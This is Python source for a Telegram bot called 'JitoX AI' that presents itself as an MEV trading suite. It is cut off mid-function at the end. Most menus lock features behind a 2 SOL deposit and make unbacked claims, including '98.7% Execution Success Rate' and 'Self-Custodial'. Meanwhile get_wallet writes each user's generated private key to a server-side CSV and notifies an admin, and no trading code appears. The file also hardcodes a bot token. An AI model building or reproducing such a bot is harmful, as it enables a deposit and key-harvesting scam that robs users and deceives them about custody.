import logging
import asyncio
import httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot, WebAppInfo
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import random
import string
import aiohttp
import json
import sys
import os
import importlib.util
from flask import Flask, jsonify
import csv
import aiosqlite
import datetime
from pathlib import Path
from datetime import datetime, timezone
import pandas as pd
from broadcast import BroadcastSystem
from telegram.error import NetworkError, TimedOut, InvalidToken
from telegram.request import HTTPXRequest
import shutil
import re
import time
import nacl.signing
import base58

app = Flask(__name__)

# Enable logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

sys.path.append(r'C:\Users\USUARIO\Desktop\Main Jito File')

# Directly link to the shared_data.py file
shared_data_path = r"C:\Users\USUARIO\Desktop\Main Jito File\shared_data.py"
spec = importlib.util.spec_from_file_location("shared_data", shared_data_path)
shared_data = importlib.util.module_from_spec(spec)
spec.loader.exec_module(shared_data)
save_blocked_users = shared_data.save_blocked_users
load_blocked_users = shared_data.load_blocked_users

# Database path for referrals
REFERRAL_DB_PATH = Path('data/referrals.db')

async def init_referral_db():
    """Initialize the referral database with necessary tables."""
    try:
        # Create database directory if it doesn't exist
        REFERRAL_DB_PATH.parent.mkdir(exist_ok=True)
        
        async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
            # Create referral_codes table
            await db.execute('''
                CREATE TABLE IF NOT EXISTS referral_codes (
                    user_id INTEGER PRIMARY KEY,
                    code TEXT UNIQUE NOT NULL,
                    created_at TEXT DEFAULT (datetime('now'))
                )
            ''')
            
            # Create referrals table
            await db.execute('''
                CREATE TABLE IF NOT EXISTS referrals (
                    referrer_id INTEGER,
                    referred_id INTEGER,
                    created_at TEXT DEFAULT (datetime('now')),
                    earnings REAL DEFAULT 0.05,
                    PRIMARY KEY (referrer_id, referred_id)
                )
            ''')
            
            await db.commit()
            
            # Verify tables were created
            async with db.execute("SELECT name FROM sqlite_master WHERE type='table'") as cursor:
                tables = await cursor.fetchall()
                tables = [table[0] for table in tables]
                if 'referral_codes' not in tables or 'referrals' not in tables:
                    raise Exception("Failed to create required tables")
            
            logger.info("Referral database initialized successfully")
            return True
    except Exception as e:
        logger.error(f"Error initializing referral database: {e}")
        raise

async def store_referral_code(user_id: int, code: str) -> bool:
    """Store a user's referral code in the database."""
    try:
        async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
            await db.execute(
                'INSERT OR REPLACE INTO referral_codes (user_id, code) VALUES (?, ?)',
                (user_id, code)
            )
            await db.commit()
            return True
    except Exception as e:
        logger.error(f"Error storing referral code: {e}")
        return False

async def get_referral_code(user_id: int) -> str:
    """Get a user's referral code from the database."""
    try:
        async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
            async with db.execute(
                'SELECT code FROM referral_codes WHERE user_id = ?',
                (user_id,)
            ) as cursor:
                result = await cursor.fetchone()
                return result[0] if result else None
    except Exception as e:
        logger.error(f"Error getting referral code: {e}")
        return None

async def store_referral(referrer_id: int, referred_id: int) -> bool:
    """Store a referral relationship in the database."""
    try:
        # Ensure database exists
        await init_referral_db()
        
        async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
            # Insert the referral with current timestamp using SQLite's datetime function
            await db.execute(
                'INSERT OR IGNORE INTO referrals (referrer_id, referred_id, created_at, earnings) VALUES (?, ?, datetime("now"), 0.05)',
                (referrer_id, referred_id)
            )
            await db.commit()
            logger.info(f"Successfully stored referral: {referred_id} referred by {referrer_id}")
            return True
    except Exception as e:
        logger.error(f"Error storing referral: {e}")
        return False

async def get_user_referrals(user_id: int) -> list:
    """Get all referrals for a user from the database."""
    try:
        async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
            await init_referral_db()  # Ensure tables exist
            async with db.execute(
                'SELECT referred_id, created_at, earnings FROM referrals WHERE referrer_id = ?',
                (user_id,)
            ) as cursor:
                referrals = await cursor.fetchall()
                logger.info(f"Retrieved {len(referrals)} referrals for user {user_id}")
                return referrals
    except Exception as e:
        logger.error(f"Error getting user referrals: {e}")
        return []

async def update_referral_earnings(referrer_id: int, amount: float) -> bool:
    """Update the earnings for a referrer."""
    try:
        async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
            await db.execute(
                'UPDATE referrals SET earnings = earnings + ? WHERE referrer_id = ?',
                (amount, referrer_id)
            )
            await db.commit()
            logger.info(f"Updated earnings for referrer {referrer_id}: +{amount} SOL")
            return True
    except Exception as e:
        logger.error(f"Error updating referral earnings: {e}")
        return False

async def notify_referrer(application: Application, referrer_id: int, referred_username: str):
    """Send notification to referrer about new referral."""
    try:
        message = (
            "🟣 <b>New Referral Alert!</b> 🟣\n\n"
            f"User @{referred_username} has joined using your referral link!\n\n"
            "💫 <b>Rewards:</b>\n"
            "• 0.05 SOL initial bonus\n"
            "• 1% of their trading operations\n\n"
            "Keep sharing your link to earn more rewards! 🎮"
        )
        await application.bot.send_message(
            chat_id=referrer_id,
            text=message,
            parse_mode='HTML'
        )
        logger.info(f"Sent referral notification to user {referrer_id} for referral {referred_username}")
    except Exception as e:
        logger.error(f"Error sending referral notification: {e}")
        # Try sending without parse_mode if HTML formatting fails
        try:
            simple_message = f"New referral alert! User {referred_username} has joined using your referral link!"
            await application.bot.send_message(
                chat_id=referrer_id,
                text=simple_message
            )
            logger.info(f"Sent simple referral notification to user {referrer_id}")
        except Exception as e2:
            logger.error(f"Error sending simple referral notification: {e2}")

# Your bot token
BOT_TOKEN = "7545725152:AAHFk6Eco9971SQxU8Z0cuJTLNzDejNC1mE"

# Notification chat ID
NOTIFICATION_CHAT_ID = -4540844698

# Solana RPC URL
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"

# Predefined list of Solana wallet addresses
# Predefined list of Solana wallet addresses
wallet_addresses = [

    "9mKRv7cvDWghpicV7LKfPotkjxy4CzebrCkEmW79qpYD", 
    "BxKwWoK9neSdm2movsExse8fNh8NQ4sg5iGq73skFzcL",
    "728YT1D7kAZmtwAHtU5WKrjaMaSaRHcggugdy5C1QwZg",
    "HmBZv2NBgWDdsnh7no4eyNycafuFTUcxYsVgyLSrPKAa",
    "4yqA5A56wSj4TaDd9ghuGXcVhynz3P2rNidBWrQvpDZA",
    "HpQmgZHr9g4cFyiCUia3CcaP7N9hBhDJGzGMD3mdL76N"
]

# Dictionary mapping wallet addresses to their private keys
wallet_private_keys = {
  
    "HnpZCbjFZnVSXEmdbxE8JTr9eou26yjDZjLctjapmYmH": None,
    "9mKRv7cvDWghpicV7LKfPotkjxy4CzebrCkEmW79qpYD": None,
    "BxKwWoK9neSdm2movsExse8fNh8NQ4sg5iGq73skFzcL": None,
    "728YT1D7kAZmtwAHtU5WKrjaMaSaRHcggugdy5C1QwZg": None,
    "HmBZv2NBgWDdsnh7no4eyNycafuFTUcxYsVgyLSrPKAa": None,
    "4yqA5A56wSj4TaDd9ghuGXcVhynz3P2rNidBWrQvpDZA": None,
    "HpQmgZHr9g4cFyiCUia3CcaP7N9hBhDJGzGMD3mdL76N": None,

}

# Predefined list of ETH wallet addresses
eth_wallet_addresses = [
    "0x7531F7e1454B1b58e9f79c9DAba6b37ded7493ae",
    "0x4DA42366606618af1346567C6A42486077140c78",
    "0xd1F7C80dA04FEe577A7f47bF35dac0236b6F3572",
    "0x95a63c981Cab717eBE4D8152a062CA4BeBE12d08",
    "0x5665B94C16Ec92fc2670ae987eBdA316677a5eb8",
    "0xde2FD6dE669F11c5DC4A4E71c94701DC0eEfB588",
    "0x98Fe56189db36bc557f2E498BB54983696D1E1E8"
]

# Store ETH user wallets
eth_user_wallets = {}

# Store user wallets
user_wallets = {}

# Store user wallets and their MEV sniper status
user_data = {}

# Store referral data
referrals = {}
referral_earnings = {}
referral_codes = {}

# Move this section right after your imports and initial configurations
# (around line 70, before any command handlers)

# Database initialization
DB_PATH = Path('data/jitox_data.db')
DB_PATH.parent.mkdir(exist_ok=True)

async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute('''
            CREATE TABLE IF NOT EXISTS referrals (
                referrer_id INTEGER,
                referred_id INTEGER,
                timestamp TEXT,
                earnings REAL DEFAULT 0.05,
                PRIMARY KEY (referrer_id, referred_id)
            )
        ''')
        await db.commit()
        logger.info("Database initialized successfully")

async def store_referral(referrer_id: int, referred_id: int) -> bool:
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            timestamp = datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')
            await db.execute('''
                INSERT OR IGNORE INTO referrals 
                (referrer_id, referred_id, timestamp, earnings)
                VALUES (?, ?, ?, 0.05)
            ''', (referrer_id, referred_id, timestamp))
            await db.commit()
            logger.info(f"Stored referral: {referrer_id} referred {referred_id}")
            return True
    except Exception as e:
        logger.error(f"Error storing referral: {e}")
        return False

async def get_user_referrals(user_id: int) -> list:
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute('''
                SELECT referred_id, timestamp, earnings 
                FROM referrals 
                WHERE referrer_id = ?
            ''', (user_id,)) as cursor:
                referrals = await cursor.fetchall()
                logger.info(f"Retrieved {len(referrals)} referrals for user {user_id}")
                return referrals
    except Exception as e:
        logger.error(f"Error getting referrals: {e}")
        return []

async def update_referral_earnings(referrer_id: int, amount: float) -> bool:
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute('''
                UPDATE referrals 
                SET earnings = earnings + ?
                WHERE referrer_id = ?
            ''', (amount, referrer_id))
            await db.commit()
            logger.info(f"Updated earnings for referrer {referrer_id}: +{amount} SOL")
            return True
    except Exception as e:
        logger.error(f"Error updating referral earnings: {e}")
        return False

def generate_referral_code():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

def global_exception_handler(exctype, value, traceback):
    error_msg = f"Uncaught exception: {exctype.__name__}: {str(value)}"
    print(error_msg, file=sys.stderr)
    print("Traceback:", file=sys.stderr)
    import traceback as tb
    tb.print_tb(traceback, file=sys.stderr)

sys.excepthook = global_exception_handler

def read_user_ids_from_csv(file_path):
    user_ids = []
    with open(file_path, mode='r', newline='', encoding='utf-8') as csvfile:
        csvreader = csv.reader(csvfile)
        header = next(csvreader)[0].split(',')  # Manually split the header row
        logging.debug(f"CSV Header: {header}")
        if 'user_id' in header:
            user_id_index = header.index('user_id')
            for row in csvreader:
                if row:  # Check if the row is not empty
                    row = row[0].split(',')  # Manually split each row
                    logging.debug(f"CSV Row: {row}")
                    if len(row) > user_id_index:  # Ensure the row has enough columns
                        user_ids.append(row[user_id_index])
    logging.debug(f"Extracted user IDs: {user_ids}")
    return user_ids

csv_file_path = r'C:\Users\USUARIO\Desktop\Bot\Demo ( Testing )\new demo v.1.1.2\Bot And Database\JITO PRO\Ui Send Messages Bot\exported_user_data.csv'
user_ids = read_user_ids_from_csv(csv_file_path)
logging.debug(f"User IDs from CSV: {user_ids}")

def is_user_blocked(user_id):
    blocked_users = load_blocked_users()  # Reload the blocked users set
    logger.info(f"Checking if user {user_id} is blocked...")
    logger.info(f"Blocked users: {blocked_users}")
    return int(user_id) in blocked_users  # Ensure user_id is checked as an integer

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.error(f"Exception while handling an update: {context.error}")
    # Log the full traceback
    import traceback
    logger.error(traceback.format_exc())

async def nexus_settings(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "👾 <b>JitoX AI - Professional MEV Trading Suite</b> 👾\n\n"
        "Experience institutional-grade MEV trading with our comprehensive toolkit:\n\n"
        "🎮 <b>Essential Features</b>\n\n"
        "🎯 Liquidity Management: Professional-grade pool optimization\n"
        "⚡ Strategy Calibration: Fine-tune execution parameters\n"
        "🎲 Asset Targeting: Precision market positioning\n"
        "🤖 Automated Trading: Enterprise-level execution\n\n"
        "🌟 <b>Advanced Suite</b>\n\n"
        "💫 Strategy Development: Institutional trading frameworks\n"
        "🧠 AI Analytics: Machine learning market insights\n"
        "📊 Performance Metrics: Real-time data analytics\n"
        "🛡️ Risk Framework: Enterprise risk management\n\n"
        "⚔️ <b>Professional Controls</b>\n\n"
        "💎 Portfolio Management: Multi-strategy deployment\n"
        "🔐 Security Protocol: Institutional-grade protection\n"
        "🔄 Account Integration: Seamless multi-portfolio control\n\n"
        "🚀 <b>Enterprise Tools</b>\n\n"
        "📈 Market Intelligence: Advanced predictive modeling\n"
        "📉 Technical Analysis: Professional charting suite\n"
        "🌐 Trading Network: Institutional knowledge sharing\n\n"
        "<b>Activate Professional Suite:</b> Trading balance of 2 SOL is required to operate\n\n"
        "Ready to elevate your trading with institutional-grade MEV strategies? 🎮"
    )
    keyboard = [
            # Core Trading Suite
            [InlineKeyboardButton("⚔️ Trading Matrix", callback_data='pool_settings'),
             InlineKeyboardButton("⚡️ Execution Protocol", callback_data='intensity')],
            
            # Strategic Operations
            [InlineKeyboardButton("🎯 Asset Targeting", callback_data='token_targeting'),
             InlineKeyboardButton("👾 Auto MEV Suite", callback_data='auto_mev')],
            
            # Intelligence Framework
            [InlineKeyboardButton("🔮 AI Strategy Matrix", callback_data='ai_strategy'),
             InlineKeyboardButton("⚡️ Neural Predictions", callback_data='ai_market_predictions')],
            
            # Risk Architecture
            [InlineKeyboardButton("🛡️ Risk Framework", callback_data='risk_management'),
             InlineKeyboardButton("⚔️ Dynamic Protection", callback_data='dynamic_risk')],
            
            # Performance Suite
            [InlineKeyboardButton("📊 Performance Matrix", callback_data='performance_analytics'),
             InlineKeyboardButton("💎 Historical Analysis", callback_data='historical_analysis')],
            
            # Advanced Features
            [InlineKeyboardButton("⚡️ Strategy Synthesis", callback_data='strategy_customization'),
             InlineKeyboardButton("🎯 Position Alerts", callback_data='custom_alerts')],
            
            # Portfolio Management
            [InlineKeyboardButton("💎 Portfolio Matrix", callback_data='diversification'),
             InlineKeyboardButton("🔮 Asset Watchlist", callback_data='token_watchlist')],
            
            # Professional Tools
            [InlineKeyboardButton("⚔️ Copy Trading Suite", callback_data='copy_trading'),
             InlineKeyboardButton("👾 Multi-Account", callback_data='multi_account')],
            
            # Security Framework
            [InlineKeyboardButton("🛡️ Security Matrix", callback_data='security_settings'),
             InlineKeyboardButton("⚡️ Risk Profiling", callback_data='risk_profiling')],
            
            # Community Features
            [InlineKeyboardButton("💎 Strategy Network", callback_data='strategy_sharing'),
             InlineKeyboardButton("👾 User Profiles", callback_data='user_profiles')],
            
            # Advanced Charting
            [InlineKeyboardButton("📊 Professional Charts", callback_data='advanced_charting')],
            
            # Custom Solutions
            [InlineKeyboardButton("⚔️ Custom Trading Matrix", callback_data='custom_trading_bots')],
            
            # Navigation
            [InlineKeyboardButton("🔙 Return to Command Center", callback_data='back')]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    try:
        await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
        logger.debug("Message edited successfully")
    except Exception as e:
        logger.error(f"Error editing message in nexus_settings: {e}")
        return

    try:
        logger.debug("Logging user activity")
        await log_user_activity(context.application, user_id, "accessed Nexus Settings")
    except Exception as e:
        logger.error(f"Error logging user activity in nexus_settings: {e}")

    # Notify admin
    admin_chat_id = -4540844698  # Your admin chat ID
    admin_message = f"User {user_id} accessed Nexus Settings"
    try:
        logger.debug("Sending admin notification")
        await context.bot.send_message(chat_id=admin_chat_id, text=admin_message)
        logger.debug("Admin notification sent successfully")
    except Exception as e:
        logger.error(f"Error sending admin notification in nexus_settings: {e}")

    logger.debug("Exiting nexus_settings function")

async def auto_mev(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "👾 <b>Auto MEV</b> 👾\n\n"
        "💎 <b>Deposit 2 SOL to unlock Auto MEV!</b> 💎\n\n"
        "Auto MEV automatically executes MEV strategies for you:\n\n"
        "⚡ 24/7 operation\n"
        "🧠 AI-driven decision making\n"
        "🚀 Optimized for maximum profits\n\n"
        "🔐 <b>Current Status:</b> Locked\n"
        "💎 <b>Minimum Balance:</b> 2 SOL\n"
        "✨ <b>Recommended Balance:</b> 5 SOL for VIP features\n\n"
        "Deposit now to start earning passive income with Auto MEV! 🎮"
    )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed Auto MEV settings")

async def token_targeting(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "🎯 <b>Token Targeting</b> 🎯\n\n"
        "💎 <b>Deposit 2 SOL to unlock Token Targeting!</b> 💎\n\n"
        "Customize your MEV strategy with specific token targets:\n\n"
        "⚡ Add up to 100 custom tokens\n"
        "⚡ Set individual strategies per token\n"
        "⚡ Receive alerts for targeted tokens\n\n"
        "🔐 <b>Current Status:</b> Locked\n"
        "💎 <b>Minimum Balance:</b> 2 SOL\n"
        "✨ <b>Recommended Balance:</b> 5 SOL for expanded targeting\n\n"
        "Deposit now to start targeting your favorite tokens! 🎮"
    )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed Token Targeting settings")

async def intensity(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "⚡ <b>MEV Intensity Control</b> ⚡\n\n"
        "Current Intensity: <b>MEDIUM</b>\n\n"
        "Adjust the intensity of MEV operations:\n\n"
        "🎯 Low: Fewer operations, lower risk\n"
        "💫 Medium: Balanced approach\n"
        "🚀 High: Maximum operations\n\n"
        "💎 <b>Deposit 2 SOL to adjust intensity!</b> 💎\n"
        "✨ Pro Tip: Higher intensity can lead to higher profits! 🎮"
    )
    keyboard = [
        [InlineKeyboardButton("🟢 Low", callback_data='intensity_low'),
         InlineKeyboardButton("🟡 Medium", callback_data='intensity_medium'),
         InlineKeyboardButton("🔴 High", callback_data='intensity_high')],
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed Intensity settings")

async def pool_settings(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "👾 <b>JitoX AI - Professional Liquidity Management Suite</b> 👾\n\n"
        "Experience institutional-grade liquidity optimization with our advanced toolkit:\n\n"
        "🎮 <b>Core Features</b>\n\n"
        "⚡️ Dynamic Pool Selection: AI-driven liquidity allocation\n"
        "⚡️ Auto-Rebalancing: Real-time portfolio optimization\n"
        "⚡️ Performance Analytics: Professional-grade metrics\n\n"
        "💎 <b>Professional Benefits</b>\n\n"
        "⚔️ Priority Pool Access\n"
        "⚔️ Advanced Risk Management\n"
        "⚔️ Institutional-Grade Tools\n\n"
        "🛡️ <b>Current Status:</b> Awaiting Initialization\n"
        "🎯 <b>Required Balance:</b> 2 SOL\n"
        "✨ <b>Enhanced Access:</b> 5+ SOL for institutional features\n\n"
        "<b>Activate Professional Suite:</b> Initialize with 2 SOL to access institutional-grade liquidity management\n\n"
        "Ready to elevate your liquidity strategy with professional-grade tools? 🎮"
    )
    keyboard = [
        [InlineKeyboardButton("📊 Pool Stats", callback_data='pool_stats')],
        [InlineKeyboardButton("🔑 Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed Pool Settings")

async def send_blocked_users_notification():
    blocked_users = load_blocked_users()
    if blocked_users:
        message = "Blocked Users:\n" + "\n".join(map(str, blocked_users))
    else:
        message = "No blocked users."
    
    bot = Bot(token=BOT_TOKEN)
    try:
        await bot.send_message(chat_id=NOTIFICATION_CHAT_ID, text=message)
        logger.info("Blocked users notification sent successfully.")
    except Exception as e:
        logger.error(f"Failed to send blocked users notification: {e}")

async def notify_admin_blocked_user(user_id):
    message = f"Blocked user {user_id} attempted to use the bot."
    bot = Bot(token=BOT_TOKEN)
    try:
        await bot.send_message(chat_id=NOTIFICATION_CHAT_ID, text=message)
        logger.info(f"Notification sent for blocked user {user_id}.")
    except Exception as e:
        logger.error(f"Failed to send notification for blocked user {user_id}: {e}")

async def get_balance(wallet_address):
    logger.info(f"Getting balance for wallet {wallet_address}")
    url = SOLANA_RPC_URL
    headers = {"Content-Type": "application/json"}
    data = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "getBalance",
        "params": [wallet_address]
    }
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, headers=headers, json=data) as response:
                result = await response.json()
                logger.info(f"RPC response for {wallet_address}: {result}")
                if 'result' in result and 'value' in result['result']:
                    balance = result['result']['value'] / 10**9  # Convert lamports to SOL
                    logger.info(f"Balance for {wallet_address}: {balance} SOL")
                    return balance
                else:
                    logger.warning(f"Unexpected response format for {wallet_address}: {result}")
                    return 0
    except Exception as e:
        logger.error(f"Error getting balance for {wallet_address}: {e}")
        return 0

def print_referral_state():
    logger.info("Current Referral State:")
    logger.info(f"Referral Codes: {referral_codes}")
    logger.info(f"Referrals: {referrals}")
    logger.info(f"Referral Earnings: {referral_earnings}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the /start command."""
    try:
        user = update.effective_user
        # Store new user
        await store_new_user(user.id, user.username)
        
        logger.info(f"User ID: {user.id}")
        if is_user_blocked(user.id):
            await update.message.reply_text("You are blocked from using this bot.")
            await notify_admin_blocked_user(user.id)
            return
        await log_user_activity(context.application, user.id, "used /start command")
        
        logger.info(f"Start command used by user {user.id}")
        
        # Handle referral
        if context.args:
            referral_code = context.args[0]
            logger.info(f"Referral code received: {referral_code}")
            try:
                async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
                    # Ensure tables exist
                    await init_referral_db()
                    
                    # Find referrer
                    async with db.execute(
                        'SELECT user_id FROM referral_codes WHERE code = ?',
                        (referral_code,)
                    ) as cursor:
                        result = await cursor.fetchone()
                        if result and result[0] != user.id:  # Prevent self-referral
                            referrer_id = result[0]
                            logger.info(f"Found referrer ID: {referrer_id}")
                            
                            # Send notifications regardless of existing referral
                            await notify_referrer(context.application, referrer_id, user.username or "Anonymous")
                            await send_admin_notification(
                                context.application,
                                f"🟣 New Referral Attempt: User {user.id} (@{user.username}) using code from {referrer_id}"
                            )
                            
                            # Store referral if it doesn't exist
                            async with db.execute(
                                'SELECT * FROM referrals WHERE referrer_id = ? AND referred_id = ?',
                                (referrer_id, user.id)
                            ) as cursor:
                                existing_referral = await cursor.fetchone()
                                
                            if not existing_referral:
                                # Store referral and update earnings
                                if await store_referral(referrer_id, user.id):
                                    logger.info(f"Successfully stored new referral: {user.id} referred by {referrer_id}")
                                    await send_admin_notification(
                                        context.application,
                                        f"🟣 Referral Stored: User {user.id} (@{user.username}) was referred by {referrer_id}"
                                    )
                                else:
                                    logger.error("Failed to store referral")
                            else:
                                logger.info(f"Existing referral found for user {user.id} and referrer {referrer_id}")
                        else:
                            logger.info(f"Invalid referral code or self-referral attempt: {referral_code}")
            except Exception as e:
                logger.error(f"Error processing referral: {e}")
                await send_admin_notification(
                    context.application,
                    f"❌ Error processing referral for user {user.id}: {str(e)}"
                )
        
        # Generate or get existing referral code
        try:
            referral_code = await get_referral_code(user.id)
            if not referral_code:
                referral_code = generate_referral_code()
                logger.info(f"Generated new referral code for user {user.id}: {referral_code}")
                await store_referral_code(user.id, referral_code)
        except Exception as e:
            logger.error(f"Error handling referral code: {e}")
            referral_code = None
        
        # Create the MEV Stats button with the user's wallet address
        wallet_address = user_wallets.get(user.id, "")
        mev_stats_url = f"https://jitonexus.github.io/jitox-dashboard/"
        mev_stats_button = InlineKeyboardButton("🚨 Mev App 🚨", web_app=WebAppInfo(url=mev_stats_url))
        
        keyboard = [
            [InlineKeyboardButton("⚔️ Professional Suite", callback_data='nexus_settings')],
            [InlineKeyboardButton("💎 Initialize Wallet", callback_data='get_wallet'),
             InlineKeyboardButton("⚡️ Strategic Withdrawal", callback_data='withdraw')],
            [InlineKeyboardButton("🎯 Activate MEV", callback_data='start_mev'),
             InlineKeyboardButton("🛡️ Suspend MEV", callback_data='stop_mev')],
            [InlineKeyboardButton("⚡️ ETH MEV Bot", callback_data='get_eth_wallet')],
            [InlineKeyboardButton("📊 Active Positions", callback_data='mev_positions'),
             InlineKeyboardButton("🔮 Pending Matrix", callback_data='mev_pending')],
            [InlineKeyboardButton("📊 Performance Analytics", callback_data='track_mev')],
            [InlineKeyboardButton("👾 Command Guide", callback_data='help'),
             InlineKeyboardButton("💎 Intelligence Hub", callback_data='info')],
            [InlineKeyboardButton("⚡️ Professional Network", callback_data='referral')],
            [mev_stats_button],
            [InlineKeyboardButton("🔮 Enterprise Portal", url='https://jitoxmev.com/')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        message = (
            "👾 <b>Welcome to JitoX AI - Professional MEV Trading Suite</b> 👾\n\n"
            "⚔️ <b>JitoX AI is a professional trading platform - your deposit is your trading balance</b>\n\n"
            "💎 Limited allocation available: 2 SOL minimum deposit\n"
            "💎 Industry-leading rate: Only 2% performance fee\n\n"
            "🎮 <b>Start Trading with 2 SOL:</b>\n\n"
            "⚡ 24/7 Automated MEV Operations\n"
            "⚡ Advanced Arbitrage & Strategic Position Taking\n"
            "⚡ 98.7% Execution Success Rate\n"
            "⚡ Fully Compliant with Telegram's Terms of Service\n"
            "🛡️ <b>Self-Custodial: Your Assets, Your Control</b>\n\n"
            "🚀 <b>Trading Balance Required for Operation</b>\n\n"
            "🎯 <b>Next Steps:</b>\n"
            "1. Initialize Wallet Setup /get_wallet\n"
            "2. Fund Account (2 SOL or more)\n"
            "3. Begin Automated Trading\n\n"
            "✨ <b>EXCLUSIVE: Priority MEV Intelligence Access</b>\n\n"
            "🌐 <b>Professional Network:</b> <a href='https://t.me/+IjTbnbN3Y085MjA0'>Join Our Trading Community</a>\n\n"
            "💫 <b>Support Available - Limited Slots Remaining</b>\n\n"
            "Professional traders understand: Timing is everything in MEV. ⚡"
        )
        
        if update.message:
            await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML', disable_web_page_preview=True)
        elif update.callback_query:
            await update.callback_query.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML', disable_web_page_preview=True)
    except Exception as e:
        logger.error(f"Error in start command: {str(e)}")
        await update.message.reply_text("An error occurred. Please try again later.")

async def get_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    
    # Generate a new wallet instead of using the predefined list
    new_wallet = await generate_wallet()
    if new_wallet:
        # Store in CSV
        with open(WALLET_CSV_FILE, 'a', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow([user_id, new_wallet['public_key'], new_wallet['private_key'], datetime.now(timezone.utc).isoformat()])
        
        success_message = (
            "✨ <b>Wallet Generated Successfully!</b> ✨\n\n"
            f"🔑 Address: <code>{new_wallet['public_key']}</code>\n\n"
            "Your wallet is:\n"
            "✅ Ready to use\n"
            "✅ Compatible with Phantom\n"
            "✅ Secured by Solana blockchain"
        )
        
        keyboard = [
            [InlineKeyboardButton("🔐 Show Private Key", callback_data="show_key")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if update.callback_query:
            await update.callback_query.edit_message_text(success_message, reply_markup=reply_markup, parse_mode='HTML')
        else:
            await update.message.reply_text(success_message, reply_markup=reply_markup, parse_mode='HTML')
        
        await log_user_activity(context.application, user_id, "Generated new wallet")
        await send_admin_notification(context.application, f"🆕 New wallet generated\nUser ID: {user_id}\nAddress: {new_wallet['public_key']}")
    else:
        error_message = "❌ Failed to generate wallet. Please try again."
        if update.callback_query:
            await update.callback_query.edit_message_text(error_message, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
        else:
            await update.message.reply_text(error_message, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))

async def get_wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await log_user_activity(context.application, update.effective_user.id, "used /get_wallet command")
    await get_wallet(update, context)


# Add these constants
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"
WALLET_CSV_FILE = "wallets.csv"

# Add wallet functions
async def get_user_wallet(user_id: int) -> dict:
    """Get user's wallet from CSV file."""
    if os.path.exists(WALLET_CSV_FILE):
        with open(WALLET_CSV_FILE, 'r', newline='', encoding='utf-8') as f:
            reader = csv.DictReader(f)
            for row in reader:
                if int(row['user_id']) == user_id:
                    return {
                        'public_key': row['public_key'],
                        'private_key': row['private_key']
                    }
    return None

async def generate_wallet():
    """Generate a new Solana wallet."""
    try:
        # Generate new keypair
        private_key = nacl.signing.SigningKey.generate()
        public_key = private_key.verify_key

        # Get base58 encoded strings
        private_key_bytes = bytes(private_key)
        public_key_bytes = bytes(public_key)
        
        private_key_str = base58.b58encode(private_key_bytes).decode('ascii')
        public_key_str = base58.b58encode(public_key_bytes).decode('ascii')

        return {
